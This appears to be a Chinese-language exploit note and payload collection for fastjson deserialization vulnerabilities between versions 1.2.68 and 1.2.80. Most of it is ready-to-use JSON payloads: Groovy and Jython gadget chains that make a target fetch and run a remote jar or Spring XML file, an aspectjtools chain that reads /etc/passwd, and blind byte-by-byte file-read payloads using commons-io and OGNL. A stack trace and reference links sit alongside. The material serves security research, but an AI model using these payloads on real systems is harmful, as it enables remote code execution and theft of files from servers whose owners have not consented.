并不是从1.2.68< version <= 1.2.80版本都能利用。
```
1.2.73的改动，允许对任意类型的field进行实例化，增加了攻击面。
```
但是1.2.68< version <1.2.73应该并不能利用。



Ref：
- [fastjson1.2.80 payload合集](https://mp.weixin.qq.com/s/SwkJVTW3SddgA6uy_e59qg)
- https://y4er.com/posts/fastjson-1.2.80/



### 最简单也最可能达成的groovy
step1:
```json
{
    "@type":"java.lang.Exception",
    "@type":"org.codehaus.groovy.control.CompilationFailedException",
    "unit":{}
}
```

step2:
```json
{
    "@type":"org.codehaus.groovy.control.ProcessingUnit",
    "@type":"org.codehaus.groovy.tools.javac.JavaStubCompilationUnit",
    "config":{
        "@type":"org.codehaus.groovy.control.CompilerConfiguration",
        "classpathList":"http://127.0.0.1:81/attack-1.jar"
    }
}
```

### jython（org.python.antlr.ParseException）
探测：
```json
{"x":{"@type":"java.lang.Character"{"@type":"java.lang.Class","val":"org.python.antlr.ParseException"}}}
```
一个请求利用：
```json
{
    "a":{
    "@type":"java.lang.Exception",
    "@type":"org.python.antlr.ParseException",
    "type":{}
    },
    "b":{
        "@type":"org.python.core.PyObject",
        "@type":"com.ziclix.python.sql.PyConnection",
        "connection":{
            "@type":"org.postgresql.jdbc.PgConnection",
            "hostSpecs":[
                {
                    "host":"127.0.0.1",
                    "port":2333
                }
            ],
            "user":"user",
            "database":"test",
            "info":{
                "socketFactory":"org.springframework.context.support.ClassPathXmlApplicationContext",
                "socketFactoryArg":"http://127.0.0.1:443/spring.xml"
            },
            "url":""
        }
    }
}
```

### aspectjtools文件读取（1.2.73 <= version <= 1.2.80）

step1:
```json
{
    "@type":"java.lang.Exception",
    "@type":"org.aspectj.org.eclipse.jdt.internal.compiler.lookup.SourceTypeCollisionException"
}
```

step2:
```
{
    "@type": "java.lang.Class",
    "val": {
        "@type": "java.lang.String" {
            "@type": "java.util.Locale",
            "val": {
                "@type": "com.alibaba.fastjson.JSONObject",
                {
                    "@type": "java.lang.String"
                    "@type": "org.aspectj.org.eclipse.jdt.internal.compiler.lookup.SourceTypeCollisionException",
                    "newAnnotationProcessorUnits": [{}]
                }
            }
		}
```

step3:
```json
{
    "x":{
        "@type":"org.aspectj.org.eclipse.jdt.internal.compiler.env.ICompilationUnit",
        "@type":"org.aspectj.org.eclipse.jdt.internal.core.BasicCompilationUnit",
        "fileName":"/etc/passwd"
    }
}
```
![image](https://github.com/shadowsock5/Poc/assets/30398606/1b76cb21-06ef-45a1-b1ab-490d0ad6b009)



对于1.2.73以及之后：
```java
setValue:54, FieldDeserializer (com.alibaba.fastjson.parser.deserializer)
parseField:124, DefaultFieldDeserializer (com.alibaba.fastjson.parser.deserializer)
createInstance:1402, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
castToJavaBean:1532, TypeUtils (com.alibaba.fastjson.util)
castToJavaBean:1454, TypeUtils (com.alibaba.fastjson.util)
cast:1079, TypeUtils (com.alibaba.fastjson.util)
cast:1281, TypeUtils (com.alibaba.fastjson.util)
toJavaObject:1219, JSON (com.alibaba.fastjson)
deserialze:294, MiscCodec (com.alibaba.fastjson.serializer)
parseObject:395, DefaultJSONParser (com.alibaba.fastjson.parser)
parse:1407, DefaultJSONParser (com.alibaba.fastjson.parser)
parse:1373, DefaultJSONParser (com.alibaba.fastjson.parser)
deserialze:105, StringCodec (com.alibaba.fastjson.serializer)
deserialze:87, StringCodec (com.alibaba.fastjson.serializer)
parseObject:395, DefaultJSONParser (com.alibaba.fastjson.parser)
parse:1407, DefaultJSONParser (com.alibaba.fastjson.parser)
parse:1373, DefaultJSONParser (com.alibaba.fastjson.parser)
deserialze:261, MiscCodec (com.alibaba.fastjson.serializer)
parseObject:395, DefaultJSONParser (com.alibaba.fastjson.parser)
parse:1407, DefaultJSONParser (com.alibaba.fastjson.parser)
parse:1373, DefaultJSONParser (com.alibaba.fastjson.parser)
parse:182, JSON (com.alibaba.fastjson)
parse:192, JSON (com.alibaba.fastjson)
parse:148, JSON (com.alibaba.fastjson)
```


### 文件盲读
1、commons-io + ognl + URLReader 单字节文件读取（回显情况观察数值）
```
{"su14":{"@type":"java.lang.Exception","@type":"ognl.OgnlException"},"su15":{"@type":"java.lang.Class","val":{ "@type":"com.alibaba.fastjson.JSONObject",{  "@type":"java.lang.String"  "@type":"ognl.OgnlException",  "_evaluation":""}},"su16":{   "@type": "ognl.Evaluation",   "node": {       "@type": "ognl.ASTMethod",       "p": {           "@type": "ognl.OgnlParser",           "stream":
{
      "@type": "org.apache.commons.io.input.BOMInputStream",
      "delegate": {
        "@type": "org.apache.commons.io.input.ReaderInputStream",
        "reader": {
          "@type": "jdk.nashorn.api.scripting.URLReader",
          "url": "file:///Users/su18/Downloads/1.txt"
          },
        "charsetName": "UTF-8",
        "bufferSize": 1024
      },"boms": [{"@type": "org.apache.commons.io.ByteOrderMark", "charsetName": "UTF-8", "bytes": [
98]}]
}}}},"su17" : {"$ref":"$.su16.node.p.stream"},"su18":{
"$ref":"$.su17.bOM.bytes"}}
```

2、commons-io + ognl + URLReader 单字节文件读取（报错布尔）
```
[{"su15":{"@type":"java.lang.Exception","@type":"ognl.OgnlException"}},{"su16":{"@type":"java.lang.Class","val":{ "@type":"com.alibaba.fastjson.JSONObject",{  "@type":"java.lang.String"  "@type":"ognl.OgnlException",  "_evaluation":""}}},
{"su17":{   "@type": "ognl.Evaluation",   "node": {       "@type": "ognl.ASTMethod",       "p": {           "@type": "ognl.OgnlParser",           "stream":
{
      "@type": "org.apache.commons.io.input.BOMInputStream",
      "delegate": {
        "@type": "org.apache.commons.io.input.ReaderInputStream",
        "reader": {
          "@type": "jdk.nashorn.api.scripting.URLReader",
          "url": "file:///Users/su18/Downloads/1.txt"
          },
        "charsetName": "UTF-8",
        "bufferSize": 1024
      },"boms": [{"@type": "org.apache.commons.io.ByteOrderMark", "charsetName": "UTF-8", "bytes": [
98]}]
}}}}},{"su18" : {"$ref":"$[2].su17.node.p.stream"}},{"su19":{
"$ref":"$[3].su18.bOM.bytes"}},{"su20":{   "@type": "ognl.Evaluation",   "node": {       "@type": "ognl.ASTMethod",       "p": {           "@type": "ognl.OgnlParser",           "stream":{     "@type": "org.apache.commons.io.input.BOMInputStream",     "delegate": {       "@type": "org.apache.commons.io.input.ReaderInputStream",       "reader":{"@type":"org.apache.commons.io.input.CharSequenceReader",
              "charSequence": {"@type": "java.lang.String"{"$ref":"$[4].su19"},"start": 0,"end": 0},       "charsetName": "UTF-8",       "bufferSize": 1024},"boms": [{"@type": "org.apache.commons.io.ByteOrderMark", "charsetName": "UTF-8", "bytes": [1]}]}}}}},{"su21" : {"$ref":"$[5].su20.node.p.stream"}}]
```
参考：
https://github.com/su18/hack-fastjson-1.2.80
